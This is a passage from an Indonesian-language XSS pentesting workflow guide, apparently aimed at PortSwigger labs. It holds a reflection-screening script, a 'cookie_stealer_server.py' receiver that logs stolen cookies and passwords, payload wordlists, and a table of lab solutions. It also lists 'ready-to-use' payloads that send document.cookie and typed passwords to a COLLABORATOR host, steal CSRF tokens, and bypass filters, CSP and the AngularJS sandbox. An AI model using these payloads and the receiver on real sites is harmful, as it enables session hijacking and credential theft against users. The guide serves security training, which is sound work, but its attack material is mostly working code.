> Untuk testing payload dan verifikasi eksekusi: gunakan **Burp Repeater + Browser**, bukan curl. curl tidak merender JavaScript.

---

# ⚙️ 11. Automation Scripts

# 11.1 Script `xss_detect.sh`

## 📌 Kapan Digunakan

Untuk screening cepat apakah suatu GET parameter: direfleksikan, mengubah response, mengandung HTML reflection. Script tidak mengklaim vulnerability hanya berdasarkan reflection.

```bash
#!/usr/bin/env bash
set -u

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

usage() {
    echo "Usage: $0 <url> <parameter>"
    echo "Example: $0 'http://TARGET/search' q"
    exit 1
}

[[ $# -eq 2 ]] || usage

URL="$1"
PARAM="$2"

if [[ ! "$URL" =~ ^https?:// ]]; then
    echo -e "${RED}[!] URL must start with http:// or https://${NC}"
    exit 1
fi

if [[ ! "$PARAM" =~ ^[A-Za-z0-9_-]+$ ]]; then
    echo -e "${RED}[!] Invalid parameter name${NC}"
    exit 1
fi

TMP="$(mktemp -d)"
trap 'rm -rf "$TMP"' EXIT

MARKER="XSS_TEST_$RANDOM"
echo -e "${BLUE}[*] URL      : $URL${NC}"
echo -e "${BLUE}[*] Parameter: $PARAM${NC}"
echo -e "${BLUE}[*] Marker   : $MARKER${NC}"
echo

echo -e "${YELLOW}=== Baseline ===${NC}"
BASE_SIZE="$(curl -ksS -o "$TMP/base" -w '%{size_download}' \
    --get --data-urlencode "${PARAM}=normal123" "$URL")"
echo "Size: ${BASE_SIZE}"

echo -e "${YELLOW}=== Reflection Test ===${NC}"
curl -ksS -o "$TMP/reflection" \
    --get --data-urlencode "${PARAM}=$MARKER" "$URL"

if grep -Fq "$MARKER" "$TMP/reflection"; then
    echo -e "${GREEN}[+] Marker reflected in response${NC}"
else
    echo "[-] Marker not reflected"
    exit 0
fi

echo -e "${YELLOW}=== Context Clues ===${NC}"
grep -n -F "$MARKER" "$TMP/reflection" | head -10

echo -e "${YELLOW}=== HTML-like PoC Reflection ===${NC}"
POC='<img src=x onerror=alert(1)>'
curl -ksS --get --data-urlencode "${PARAM}=$POC" "$URL" -o "$TMP/poc"
if grep -Eq '(<img|onerror=|<svg|<script)' "$TMP/poc"; then
    echo -e "${GREEN}[+] HTML/XSS payload appears in response${NC}"
    echo "[!] Validate exact browser execution context manually."
else
    echo "[-] Basic HTML payload not obviously reflected"
fi

echo -e "${YELLOW}=== Next Steps ===${NC}"
echo "1. Inspect exact reflection context (HTML body? attribute? JS?)"
echo "2. Select context-specific payload (Section 5)"
echo "3. Check CSP and sanitization (Section 9)"
echo "4. Confirm actual execution in browser (not curl)"
```

Jalankan:

```bash
chmod +x xss_detect.sh
./xss_detect.sh 'http://TARGET/search' q
```

---

# 11.2 Script cookie_stealer_server.py

Server dengan logging yang proper untuk lab:

```python
#!/usr/bin/env python3
from http.server import BaseHTTPRequestHandler, HTTPServer
from datetime import datetime, timezone
from urllib.parse import urlparse, parse_qs
import argparse
import ipaddress
import sys

class CallbackHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        parsed = urlparse(self.path)
        params = parse_qs(parsed.query)
        timestamp = datetime.now(timezone.utc).isoformat()
        ip = self.client_address[0]

        print("\n" + "=" * 55)
        print("XSS CALLBACK")
        print("=" * 55)
        print(f"Timestamp : {timestamp}")
        print(f"IP        : {ip}")
        print(f"Path      : {parsed.path}")

        if "c" in params:
            print(f"Cookie    : {params['c'][0]}")
        else:
            print("Cookie    : <none>")

        if "event" in params:
            print(f"Event     : {params['event'][0]}")

        if "user" in params and "pass" in params:
            print(f"Username  : {params['user'][0]}")
            print(f"Password  : {params['pass'][0]}")

        self.send_response(200)
        self.send_header("Content-Type", "text/plain")
        self.send_header("Cache-Control", "no-store")
        self.end_headers()
        self.wfile.write(b"OK\n")

    def log_message(self, fmt, *args):
        return

def parse_port(value):
    try:
        port = int(value)
    except ValueError:
        raise argparse.ArgumentTypeError("Port must be numeric")
    if not 1 <= port <= 65535:
        raise argparse.ArgumentTypeError("Port must be 1-65535")
    return port

def validate_bind(value):
    try:
        ipaddress.ip_address(value)
        return value
    except ValueError:
        if value == "localhost":
            return value
        raise argparse.ArgumentTypeError("Bind must be a valid IP or localhost")

def main():
    parser = argparse.ArgumentParser(
        description="XSS callback receiver for authorized labs"
    )
    parser.add_argument("-p", "--port", type=parse_port, default=8000)
    parser.add_argument("--bind", type=validate_bind, default="0.0.0.0")
    args = parser.parse_args()

    try:
        server = HTTPServer((args.bind, args.port), CallbackHandler)
    except OSError as exc:
        print(f"[!] Failed to bind server: {exc}", file=sys.stderr)
        sys.exit(1)

    print(f"[*] XSS receiver listening on {args.bind}:{args.port}")
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        print("\n[*] Server stopped")
    finally:
        server.server_close()

if __name__ == "__main__":
    main()
```

Jalankan:

```bash
python3 cookie_stealer_server.py --port 8000
```

Test manual:

```bash
curl 'http://127.0.0.1:8000/?c=test_cookie&event=lab'
```

---

# 11.3 XSS Payload Wordlist Generator

```python
#!/usr/bin/env python3
# Generates XSS payloads per context

payloads = {
    "html_body": [
        "<script>alert(1)</script>",
        "<img src=1 onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<details open ontoggle=alert(1)>",
        "<video><source onerror=alert(1)>",
        "<input autofocus onfocus=alert(1)>",
    ],
    "html_attribute": [
        "\" onmouseover=\"alert(1)",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "' onmouseover='alert(1)",
    ],
    "js_string_single": [
        "'-alert(1)-'",
        "';alert(1)//",
        "\\'-alert(1)//",
    ],
    "js_template_literal": [
        "${alert(1)}",
    ],
    "href_attribute": [
        "javascript:alert(1)",
        "JaVaScRiPt:alert(1)",
        "java&#115;cript:alert(1)",
    ],
    "onclick_html_entity": [
        "http://foo?&apos;-alert(1)-&apos;",
    ],
    "filter_bypass": [
        "<sCrIpT>alert(1)</sCrIpT>",
        "<img/src=1/onerror=alert(1)>",
        "<svg><animate onbegin=alert(1) attributeName=x>",
        "<svg><animatetransform onbegin=alert(1)>",
        "<xss id=x onfocus=alert(1) tabindex=1>",
        "<script>alert`1`</script>",
        "javascript:throw onerror=alert,1337",
    ],
}

if __name__ == '__main__':
    import sys
    context = sys.argv[1] if len(sys.argv) > 1 else None

    if context and context in payloads:
        for p in payloads[context]:
            print(p)
    else:
        print("Available contexts:", list(payloads.keys()))
        print("\nAll payloads:")
        for ctx, plist in payloads.items():
            print(f"\n# {ctx}")
            for p in plist:
                print(p)
```

---

# 🌳 12. Master Decision Tree

```text
START: Parameter / Input Ditemukan
│
├─ 0. RECON
│   ├─ Cek response headers: CSP? AngularJS? Framework?
│   ├─ Cek JS files: ada source → sink path?
│   └─ AngularJS detected → test {{7*7}} di setiap input → ke 3D
│
├─ 1. REFLECTION TEST (Burp Repeater)
│   ├─ Kirim xss1234 → cek response
│   ├─ [Reflected langsung]                    → ke step 2
│   ├─ [Stored — muncul di halaman lain]       → ke step 4
│   ├─ [Tidak di response tapi ada di DOM]     → DOM XSS → ke step 3
│   └─ [Tidak muncul sama sekali]              → coba POST, coba header, cek Stored
│
├─ 2. CONTEXT IDENTIFICATION (dari response di Repeater)
│   ├─ <div>xss1234</div>                → HTML Body → Section 5.1
│   ├─ value="xss1234"                  → HTML Attribute → Section 5.2
│   ├─ href="xss1234"                   → href Context → Section 5.3
│   ├─ var x = 'xss1234';               → JS String → Section 5.4
│   ├─ var x = `xss1234`;               → Template Literal → Section 5.5
│   ├─ onclick="goto('xss1234')"        → onclick Handler → Section 5.6
│   ├─ <link href='xss1234'/>           → Canonical Link → Section 5.7
│   ├─ color: xss1234                   → CSS Context → Section 5.9
│   ├─ {"name":"xss1234"}               → JSON Context → Section 5.10
│   └─ <div ng-app>...xss1234...        → AngularJS CSTI → Section 5.11
│
├─ 3. DOM XSS PATH (DevTools + Browser)
│   ├─ F12 → Sources → search innerHTML / document.write / eval
│   ├─ Trace source → sink
│   ├─ [innerHTML sink]       → <img src=1 onerror=alert(1)>
│   ├─ [document.write sink]  → "><svg onload=alert(1)>
│   ├─ [eval / setTimeout]    → alert(1) langsung
│   ├─ [jQuery href sink]     → javascript:alert(1)
│   └─ [jQuery selector]      → <img src=1 onerror=alert(1)>
│
├─ 4. STORED XSS PATH
│   ├─ Inject via Burp Intercept / Repeater
│   ├─ Navigate ke halaman yang render stored content
│   ├─ [Visible page] → alert confirm, lanjut impact
│   └─ [Admin-only page] → Blind XSS → Burp Collaborator (Section 4.3)
│
├─ 5. PAYLOAD GAGAL — DIAGNOSA
│   ├─ [Direfleksikan tapi encoded] → identifikasi encoding schema (Section 5.4)
│   ├─ [Tag di-strip]              → filter bypass (Section 6.1, 6.2)
│   ├─ [Keyword diblok]            → keyword bypass (Section 6.5, 6.6)
│   ├─ [Spasi/bracket diblok]      → Section 6.7, 6.8
│   ├─ [Context dibaca salah]      → kembali ke step 2
│   └─ [CSP violation di console]  → Section 9
│
├─ 6. FILTER / WAF BYPASS (kalau payload diblok)
│   ├─ Burp Intruder → fuzz tags (Section 6.1)
│   ├─ Burp Intruder → fuzz event handlers (Section 6.2)
│   ├─ Custom tags (Section 6.3)
│   ├─ SVG bypass (Section 6.4)
│   └─ Keyword/quote/space/bracket bypass (Section 6.5–6.8)
│
├─ 7. CSP BYPASS (kalau ada CSP)
│   ├─ Cek CSP di response headers
│   ├─ Paste ke csp-evaluator.withgoogle.com
│   ├─ [unsafe-inline]           → inject langsung
│   ├─ [unsafe-eval]             → eval/Function/setTimeout string variant
│   ├─ [whitelisted domain]      → cari JSONP endpoint (Section 9.4)
│   ├─ [AngularJS + sandbox]     → escape sandbox (Section 9.5)
│   ├─ [event handlers blocked]  → SVG animate trick (Section 9.6)
│   ├─ [report-uri injectable]   → inject directive (Section 9.9)
│   └─ [semua diblok]            → dangling markup (Section 9.8)
│
└─ 8. IMPACT ASSESSMENT
    ├─ [Cookie accessible]    → steal cookie → session hijack (Section 7)
    ├─ [HttpOnly cookie]      → CSRF via XSS → action as victim (Section 8.2)
    ├─ [Admin view page]      → blind XSS → admin cookie (Section 4)
    └─ [Semua cookie blocked] → credential capture (Section 8.1)
```

---

# 📋 13. PortSwigger Lab Quick Reference

|Lab|Context|Key Encoding|Payload|
|---|---|---|---|
|Reflected XSS into HTML context with nothing encoded|HTML body|Tidak ada|`<script>alert(1)</script>`|
|Stored XSS into HTML context with nothing encoded|HTML body|Tidak ada|`<script>alert(1)</script>`|
|DOM XSS in document.write sink using source location.search|document.write|Client-side|`"><svg onload=alert(1)>`|
|DOM XSS in innerHTML sink using source location.search|innerHTML|Client-side|`<img src=1 onerror=alert(1)>`|
|DOM XSS in jQuery anchor href using location.search|jQuery href|Client-side|`javascript:alert(1)`|
|DOM XSS in jQuery selector sink using hashchange|jQuery selector|Client-side|iframe + `<img src=1 onerror=print()>`|
|Reflected XSS into attribute with angle brackets HTML-encoded|HTML attribute|`<>` encoded|`" onmouseover="alert(1)`|
|Stored XSS into anchor href with double quotes HTML-encoded|href|`"` encoded|`javascript:alert(1)`|
|Reflected XSS into JS string with angle brackets HTML encoded|JS string|`<>` encoded|`'-alert(1)-'`|
|DOM XSS in document.write inside a select element|document.write + select|Client-side|`</select><img src=1 onerror=alert(1)>`|
|DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded|AngularJS `{{ }}`|`<>` dan `"` encoded|`{{$on.constructor('alert(1)')()}}`|
|Reflected DOM XSS|eval (JSON)|JSON escape|`\"-alert(1)}//`|
|Stored DOM XSS|innerHTML|Partial sanitize|`<><img src=1 onerror=alert(1)>`|
|Reflected XSS with most tags and attributes blocked|HTML body|WAF|Burp Intruder fuzz → `<body onresize=print()>` via iframe|
|Reflected XSS with all tags blocked except custom ones|HTML body|Block all std tags|`<xss id=x onfocus=alert(1) tabindex=1>#x`|
|Reflected XSS with some SVG markup allowed|SVG|Partial block|`<svg><animatetransform onbegin=alert(1)>`|
|Reflected XSS in canonical link tag|link href|`<>` encoded|`?'accesskey='x'onclick='alert(1)`|
|Reflected XSS into JS string with single quote and backslash escaped|JS string|`'` dan `\` escaped|`</script><script>alert(1)</script>`|
|Reflected XSS into JS string with angle brackets & double quotes HTML-encoded and single quotes escaped|JS string|`<>"` encoded, `'` escaped, `\` tidak|`\'-alert(1)//`|
|Stored XSS into onclick with angle brackets & double quotes HTML-encoded and single quotes & backslash escaped|onclick JS string|semua diblok|`http://foo?&apos;-alert(1)-&apos;`|
|Reflected XSS into template literal with all chars Unicode-escaped|JS template literal|semua diblok|`${alert(1)}`|
|Exploiting XSS to steal cookies|Stored XSS exploitation|-|`<script>fetch('//COLLABORATOR/?c='+document.cookie)</script>`|
|Exploiting XSS to capture passwords|Stored XSS + form inject|-|`<input name=username id=username><input type=password onchange=fetch('//COLLAB/?u='+...+this.value)>`|
|Exploiting XSS to bypass CSRF|Stored XSS + token steal|-|Fetch `/my-account` → extract csrf → submit change|
|Reflected XSS with AngularJS sandbox escape without strings|AngularJS sandbox|string chars blocked|`toString().constructor.prototype.charAt=[].join;[1]\|orderBy:toString().constructor.fromCharCode(...)=1`|
|Reflected XSS with AngularJS sandbox escape and CSP|AngularJS + CSP|sandbox + CSP|`<input id=x ng-focus=$event.composedPath()\|orderBy:'(z=alert)(1)'>`|
|Reflected XSS with event handlers and href blocked|HTML + SVG|event attrs blocked|`<svg><a><animate attributeName=href values=javascript:alert(1)/><text y=20>click</text></a></svg>`|
|Reflected XSS in a JS URL with some characters blocked|javascript: URL|`()` blocked|`javascript:throw onerror=alert,1337`|
|Reflected XSS protected by strict CSP, with dangling markup attack|Dangling markup|CSP blocks scripts|`<img src='https://ATTACKER/?data=` (unclosed attr)|
|Reflected XSS protected by CSP, with CSP bypass|CSP header injection|CSP aktif|`?search=<img src=1 onerror=alert(1)>&token=;script-src-attr 'unsafe-inline'`|

---

# 🛠️ 14. Common Errors & Troubleshooting

|Error / Situasi|Penyebab|Solusi|
|---|---|---|
|Payload muncul di source tapi tidak execute|CSP blocking atau context salah|Cek Console browser (F12), cek CSP header|
|`alert()` tidak muncul meski payload di-reflect|Context salah atau encoding|Re-analisis context di Burp Repeater response|
|`&lt;script&gt;` muncul bukannya `<script>`|HTML encoding aktif|Coba attribute context atau JS context injection|
|Payload hilang sama sekali dari response|WAF atau filter memblok|Gunakan filter identification script (Section 6.9)|
|`document.cookie` kosong|Cookie HttpOnly=true|Beralih ke CSRF via XSS atau credential capture|
|Stored payload hilang setelah submit|Server-side sanitization|Coba bypass (Section 5, 6), cek API endpoint, cek Burp History|
|DOM XSS tidak trigger di curl|DOM XSS = client-side|Test selalu di browser, bukan curl|
|Blind XSS tidak dapat callback|Collaborator URL tidak reachable atau payload salah|Test payload di browser dulu secara langsung|
|`Refused to connect` di browser console|CSP blok outbound|Gunakan `<img>` tag bukan `fetch` untuk exfil|
|AngularJS `{{ }}` tidak di-eval|`ng-app` tidak aktif di area tersebut|Periksa scope ng-app di DevTools|
|`<script>` di innerHTML tidak execute|Ini memang behavior browser|Gunakan `<img onerror>` atau `<svg onload>`|
|Payload berhasil di Burp Render tapi gagal di browser|Browser-level XSS filter (jarang)|Test di browser yang berbeda|
|`'` escaped jadi `\'` tapi masih bisa exploit|Kalau `\` tidak di-escape|Gunakan `\'-alert(1)//` trick (Section 5.4c)|
|`'` dan `\` keduanya escaped|Tidak bisa escape string langsung|Coba `</script>` breakout (Section 5.4b) atau HTML entity trick|
|Template literal `${}` tidak execute|Bukan template literal (pakai `'` atau `"`)|Identifikasi ulang context dari source|
|AngularJS payload tidak jalan|Bukan ng-app atau versi AngularJS berbeda|Verifikasi ng-app di page source, cek versi|
|CSP blok tapi ada JSONP endpoint|Misconfig pada whitelist|Cari JSONP endpoint di domain yang di-whitelist (Section 9.4)|
|Dalfox/XSStrike tidak menemukan|Butuh auth atau kompleks context|Manual testing dengan Burp Repeater dan cookie|
|`fetch` ke Collaborator tidak dapat hit|Network issue di lab|Coba Exploit Server PortSwigger, coba `<img src=...>`|
|`</script>` dalam JS string tidak break tag|`<>` di-HTML-encode|Cek encoding, coba JS string escape lain (Section 5.4)|
|Canonical link payload tidak trigger|Harus tekan accesskey|Di lab PortSwigger: tekan Alt+Shift+X di Chrome|
|`javascript:` di href tidak execute|Browser/sanitizer blok scheme|Coba case variation: `JaVaScRiPt:`|
|Dangling markup tidak capture data|Injection point bukan sebelum sensitive data|Analisis halaman HTML, cari posisi injection yang benar|
|CSP header injection tidak berhasil|Parameter tidak di-reflect ke header|Cek apakah parameter benar-benar ada di CSP header response|
|CSS injection ditemukan tapi tidak ada JS|CSS ≠ XSS otomatis|Cari apakah bisa close `</style>` dan inject HTML (Section 5.9)|
|JSON reflection ditemukan tapi tidak execute|JSON bukan HTML sink|Trace apakah data akhirnya masuk `innerHTML`/script context (Section 5.10)|
|Space/whitespace difilter dalam attribute|Filter whitespace agresif|Gunakan `/` atau tab atau newline (Section 6.7)|
|`()` difilter, tidak bisa call function|Bracket filter aktif|Gunakan backtick `alert\`1``atau`throw onerror=alert,1337` (Section 6.8)|
|Port 8000 already in use|Process lain menggunakan port|`lsof -i :8000` kemudian `kill PID`, atau gunakan port lain|
|Blind XSS callback tapi cookie kosong|HttpOnly atau no auth cookie|Gunakan non-sensitive callback proof, lanjut ke CSRF via XSS|
|`unsafe-eval` ada di CSP tapi eval tidak bekerja|Input tidak masuk ke eval call|Cari trusted script yang menerima user input dan memanggil eval/Function/setTimeout|

---

# ✅ 15. Final XSS Checklist

```text
PRE-TEST
[ ] Parameter/input ditemukan
[ ] Reflection diuji (marker xss1234)
[ ] Stored behavior diuji (marker persist setelah reload)
[ ] DOM source diperiksa (F12 → Sources → cari dangerous sources)

CONTEXT IDENTIFICATION
[ ] Exact context diidentifikasi (HTML body? attribute? JS? CSS? JSON?)
[ ] Encoding yang diterapkan diketahui (<>? quotes? backslash?)
[ ] CSP diperiksa (ada? strict? misconfigured?)
[ ] WAF/filter behavior diperiksa

PAYLOAD TESTING
[ ] HTML context diuji (jika applicable)
[ ] Attribute context diuji (jika applicable)
[ ] JavaScript context diuji (jika applicable)
[ ] Template literal context diuji (jika applicable)
[ ] URL/href context diuji (jika applicable)
[ ] CSS context diuji (jika applicable)
[ ] JSON context diuji (jika applicable)
[ ] Filter bypass diterapkan jika diperlukan

VALIDATION
[ ] PoC execution berhasil (di browser, bukan curl)
[ ] Reflected / Stored / DOM classification benar
[ ] Exact sink ditemukan dan dikonfirmasi

IMPACT
[ ] Impact dinilai (cookie? credentials? CSRF? blind?)
[ ] HttpOnly/SameSite/Secure cookie dianalisis
[ ] Authenticated actions diuji pada lab
[ ] Callback server tersedia bila dibutuhkan

EVIDENCE
[ ] Finding divalidasi secara manual
[ ] Evidence disimpan (screenshot, request, payload)
```

---

# ⚡ 16. Quick Reference

## Input → Context → Test → Failed → Diagnose

```text
INPUT DITEMUKAN
↓
Kirim: q=xss1234 (Burp Repeater)
↓
[Muncul di response]
   ↓
   Lihat DIMANA muncul (context):
   HTML body    → <script>alert(1)</script>  atau  <img src=1 onerror=alert(1)>
   Attribute    → " onmouseover="alert(1)
   JS string '  → '-alert(1)-'
   JS string "  → "-alert(1)-"
   Template lit → ${alert(1)}
   onclick      → http://foo?&apos;-alert(1)-&apos;
   href         → javascript:alert(1)
   CSS          → close: red}</style><img src=1 onerror=alert(1)>
   JSON         → trace ke DOM sink
   AngularJS    → {{$on.constructor('alert(1)')()}}
   ↓
   [Payload tidak execute]
   ↓
   Apakah di-encode? → identifikasi encoding → pilih sub-scenario (5.4a-d)
   Apakah tag di-strip? → Burp Intruder fuzz tags (6.1)
   Apakah keyword diblok? → bypass (6.5, 6.6, 6.7, 6.8)
   Apakah CSP violation di console? → Section 9
   ↓
[Tidak muncul di response]
   ↓
   Cek Stored: navigate ke halaman lain setelah submit
   Cek DOM: F12 → Sources → search innerHTML, location.hash, eval
```

---

## Payload Siap Pakai per Context

### HTML Body

```html
<script>alert(1)</script>
<img src=1 onerror=alert(1)>
<svg onload=alert(1)>
<details open ontoggle=alert(1)>
<input autofocus onfocus=alert(1)>
<video><source onerror=alert(1)>
```

### HTML Attribute

```text
" onmouseover="alert(1)
" autofocus onfocus="alert(1)
' onmouseover='alert(1)
```

### JavaScript String

```text
'-alert(1)-'
';alert(1)//
\'-alert(1)//         ← single quotes escaped, backslash tidak
</script><script>alert(1)</script>   ← single quote + backslash escaped
```

### Template Literal

```text
${alert(1)}
```

### onclick (HTML Entity)

```text
http://foo?&apos;-alert(1)-&apos;
```

### href Attribute

```text
javascript:alert(1)
javascript:throw onerror=alert,1337    ← ketika () diblok
```

### AngularJS CSTI

```text
{{7*7}}                                         ← probe
{{$on.constructor('alert(1)')()}}               ← exploit
{{constructor.constructor('alert(1)')()}}       ← alternatif
```

### Custom Tags (All Tags Blocked)

```text
<xss id=x onfocus=alert(1) tabindex=1>   (plus #x in URL)
```

### SVG Bypass

```html
<svg><animatetransform onbegin=alert(1)>
<svg><animate onbegin=alert(1) attributeName=x>
<svg><a><animate attributeName=href values=javascript:alert(1)/><text y=20>click</text></a></svg>
```

### Canonical Link Tag

```text
?'accesskey='x'onclick='alert(1)
```

### Cookie Theft

```html
<script>
fetch('https://COLLABORATOR/?c='+encodeURIComponent(document.cookie))
</script>
```

### CSRF via XSS (Fetch Token)

```html
<script>
fetch('/my-account').then(r=>r.text()).then(html=>{
  var t=html.match(/name="csrf" value="(\w+)"/)[1];
  fetch('/my-account/change-email',{method:'POST',body:'csrf='+t+'&email=x@x.com',headers:{'Content-Type':'application/x-www-form-urlencoded'}})
})
</script>
```

### Password Capture

```html
<input name=username id=username>
<input type=password name=password onchange="fetch('https://COLLABORATOR/?u='+document.getElementById('username').value+'&p='+this.value)">
```

---

> **➡️ NEXT:** Setelah XSS selesai dan berhasil mendapat session/credentials, lanjut ke **[🧬 21 — XXE Workflow](/docs/xxe)** untuk handle XML-based injection, atau ke **[🔐 27 — IDOR / Access Control Workflow](/docs/idor-access-control)** jika akses admin panel sudah didapat tapi perlu escalate privileges lebih lanjut.
> 
> **Jika XSS menghasilkan internal network access:** lanjut ke **[🌐 22 — SSRF Workflow](/docs/ssrf)** karena XSS + fetch ke internal = SSRF via victim browser.